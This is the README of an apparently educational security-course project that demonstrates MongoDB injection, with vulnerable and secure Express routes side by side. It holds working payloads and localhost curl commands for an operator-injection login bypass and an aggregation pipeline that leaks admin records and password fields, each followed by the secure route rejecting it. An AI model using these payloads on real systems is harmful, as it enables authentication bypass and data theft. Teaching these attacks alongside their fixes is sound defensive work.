# MongoDB Injection Demo — ISSC Course

> Demo project for the *Information Systems Security Course (ISSC)* showcasing NoSQL / MongoDB injection vulnerabilities and their mitigations. This repository intentionally includes both **vulnerable** and **secure** routes so you can observe attacks and verify fixes.

---

## Table of contents

1. [Overview](#overview)  
2. [Features](#features)  
3. [Tech stack & tools](#tech-stack--tools)  
4. [Repository structure](#repository-structure-high-level)  
5. [Installation & setup](#installation--setup)  
6. [Environment variables (.env.example)](#environment-variables-envexample)  
7. [Running the demo](#running-the-demo)  
8. [How to perform the demonstration (step-by-step)](#how-to-perform-the-demonstration-step-by-step)  
   1. [Operator Injection: Vulnerable vs Secure login](#1-operator-injection-vulnerable-vs-secure-login)  
   2. [Aggregation pipeline demo](#2-aggregation-pipeline-demo)
   3. $where / eval demo (disabled by default)
   4. Projection/data exfiltration Injection
   5. Regex / ReDoS Injection
9. [Example payloads & curl requests](#example-payloads--curl-requests)  
10. [Acknowledgements & license](#acknowledgements--license)

---

## Overview

This repository is a controlled, educational demonstration of **MongoDB Injection** (NoSQL injection) attack patterns and mitigations. It contains two route groups:

- **/vuln** — intentionally vulnerable endpoints used only for local demonstrations (operator injection, projection abuse, unsafe aggregation).
- **/secure** — hardened endpoints that demonstrate validation, sanitization, whitelisted projections, regex escaping, and validated aggregation pipelines.

Use this project to reproduce attacks, show impact, and demonstrate how secure coding patterns prevent exploitation.

---

## Features

- Demonstrates operator injection and aggregation-pipeline injection.
- Secure counterparts showing:
  - Joi validation (input shape and types),
  - request sanitization (remove `$` and `.` keys),
  - projection whitelisting,
  - pipeline validation (allowlist stages & fields).
- Simple React frontend with two login flows (vulnerable vs secure).
- Environment flags to gate vulnerable routes (`ALLOW_VULN`, `ALLOW_EVAL_VULN`).

---

## Tech stack & tools

- Node.js (>= 16 recommended)  
- npm or yarn  
- Express.js  
- Mongoose (MongoDB)  
- React (frontend)  
- MongoDB (local or Atlas)  
- Postman / curl for testing

---

## Repository structure (high level)

```
/ (repo root)
├─ backend/ (express server files)
│  ├─ server.js
│  ├─ routes/
│  │  ├─ vuln.js
│  │  └─ secure.js
│  ├─ models/User.js
│  └─ utils/
│     ├─ sanitize.js
│     └─ mongoSanitize.js
├─ frontend/ (react app)
│  └─ src/components/Login.jsx
├─ README.md
└─ .env.example
```

---

## Installation & setup

### 1) Clone repository
```bash
git clone <your-repo-url>.git
cd <repo-folder>
```

### 2) Backend setup
```bash
cd backend
npm install
# or
# yarn install
```
Create `backend/.env` (see `.env.example` below).

### 3) Frontend setup
Open a new terminal and install frontend dependencies:
```bash
cd frontend
npm install
# or
# yarn
```

---

## Environment variables (.env.example)

Create `backend/.env` with values similar to:

```
PORT=8080
MONGO_URI=mongodb://127.0.0.1:27017/mongo_inject_demo
ALLOW_VULN=0            # set to 1 only on local demo machines
ALLOW_EVAL_VULN=0       # set to 1 ONLY when you intend to demo $where/eval (dangerous)
```


---

## Running the demo

Open two terminals (backend and frontend):

### Start backend
```bash
cd backend
# ensure .env present
npm run start
# or
node server.js
```
You should see: `MongoDB connected` and `server running http://localhost:8080`.

### Start frontend
```bash
cd frontend
npm run dev   # or npm start depending on your setup
```
Open the frontend in your browser (for example http://localhost:5173 or http://localhost:3000).

### Enabling vulnerable routes (demo only)
1. Stop the backend server.
2. Edit `backend/.env` and set:
```
ALLOW_VULN=1
# If you want to demonstrate $where/eval (EXTREMELY DANGEROUS):
ALLOW_EVAL_VULN=1
```
3. Restart backend. You will see console warning when vuln routes are mounted.

---

## How to perform the demonstration (step-by-step)

Below are two focused demos: **Operator Injection** then **Aggregation Pipeline**.

---

### 1) Operator Injection: Vulnerable vs Secure login

**Goal:** Show how operator injection can bypass authentication on a vulnerable route and how secure validation blocks it.

**Vulnerable route:** `POST /vuln/login-operator-injection` — uses the request body directly in the MongoDB query.  
**Secure route:** `POST /secure/login-secure` — validates input with Joi, sanitizes strings, and compares hashed password.

**Steps (demo flow):**
1. Open the frontend Login page (it has two buttons: *Vulnerable Login* and *Secure Login*).
2. Click **Fill demo creds** (`alice` / `password123`) and use **Secure Login** — show successful secure login (if user exists).
3. Click **Fill operator** to put `{"$ne":""}` in username. Click **Vulnerable Login** — vulnerable route may return a user (auth bypass).
4. Click **Secure Login** with the operator payload — the secure route should reject it (validation or sanitization).

**VULNERABLE (example payload):**
```json
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}
```

**curl (vulnerable):**
```bash
curl -X POST http://localhost:8080/vuln/login-operator-injection \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

**Expected vulnerable output (demo):**

<img width="1000" height="1000" alt="image" src="https://github.com/user-attachments/assets/98c1e380-de64-4414-b3a9-a5d1cda71e9a" />



**Secure check (should be blocked):**
```bash
curl -X POST http://localhost:8080/secure/login-secure \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
# -> 400 Bad Request or 401 Unauthorized
```

**Expected secure output (blocked):**

<img width="1000" height="1000" alt="image" src="https://github.com/user-attachments/assets/94ba3272-7a43-4015-8379-c9e90498ab9b" />


---

### 2) Aggregation pipeline demo

**Goal:** Show dangers of executing user-supplied aggregation pipelines blindly and how validated pipelines mitigate risk.

**Vulnerable endpoint:** `POST /vuln/aggregate-vuln` — executes whatever pipeline user submits.  
**Secure endpoint:** `POST /secure/aggregate-secure` — validates pipeline stages, allowed operators, and whitelisted projection fields.

#### Step A — Benign pipeline (vulnerable endpoint)
**Payload:**
```json
{
  "pipeline": [
    { "$match": { "role": "user" } },
    { "$project": { "username": 1, "email": 1 } }
  ]
}
```
**curl:**
```bash
curl -X POST http://localhost:8080/vuln/aggregate-vuln \
  -H "Content-Type: application/json" \
  -d '{"pipeline":[{"$match":{"role":"user"}},{"$project":{"username":1,"email":1}}]}'
```
**Expected:** returns matching documents with projected fields.

<img width="1000" height="1000" alt="image" src="https://github.com/user-attachments/assets/4e41d73f-0395-413b-a150-0bc976e410a4" />


#### Step B — Malicious pipeline (vulnerable endpoint)
**Malicious payload (leak admin accounts / sensitive fields):**
```json
{
  "pipeline": [
    { "$match": { "$expr": { "$eq": ["$role", "admin"] } } },
    { "$project": { "username": 1, "email": 1, "password": 1 } }
  ]
}
```
**curl:**
```bash
curl -X POST http://localhost:8080/vuln/aggregate-vuln \
  -H "Content-Type: application/json" \
  -d '{"pipeline":[{"$match":{"$expr":{"$eq":["$role","admin"]}}},{"$project":{"username":1,"email":1,"password":1}}]}'
```
**Expected (vulnerable):** returns admin documents — demonstrates risk.

<img width="1000" height="1000" alt="image" src="https://github.com/user-attachments/assets/df7fdd6b-e550-4520-8dd3-c95611c918aa" />

#### Step C — Same malicious payload vs secure endpoint
**curl (secure):**
```bash
curl -X POST http://localhost:8080/secure/aggregate-secure \
  -H "Content-Type: application/json" \
  -d '{"pipeline":[{"$match":{"$expr":{"$eq":["$role","admin"]}}}]}'
```
**Expected (secure):**
```json
{ "error": "invalid pipeline" }
```

<img width="1000" height="1000" alt="image" src="https://github.com/user-attachments/assets/b6a99949-6cd5-48fa-a310-f50a446baa04" />


---

## Example payloads & curl requests

**Operator Injection (vulnerable):**
```bash
curl -X POST http://localhost:8080/vuln/login-operator-injection \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": "anything"}'
```

**Operator Injection (secure check, blocked):**
```bash
curl -X POST http://localhost:8080/secure/login-secure \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": "anything"}'
```

**Aggregation (vulnerable - leak admin):**
```bash
curl -X POST http://localhost:8080/vuln/aggregate-vuln \
  -H "Content-Type: application/json" \
  -d '{"pipeline":[{"$match":{"$expr":{"$eq":["$role","admin"]}}},{"$project":{"username":1,"email":1,"password":1}}]}'
```

**Aggregation (secure - blocked):**
```bash
curl -X POST http://localhost:8080/secure/aggregate-secure \
  -H "Content-Type: application/json" \
  -d '{"pipeline":[{"$match":{"$expr":{"$eq":["$role","admin"]}}}]}'
```

---

## Acknowledgements & license

Prepared for the **Information Systems Security Course (ISSC)**. This repository contains intentionally vulnerable code for pedagogical purposes only.

---

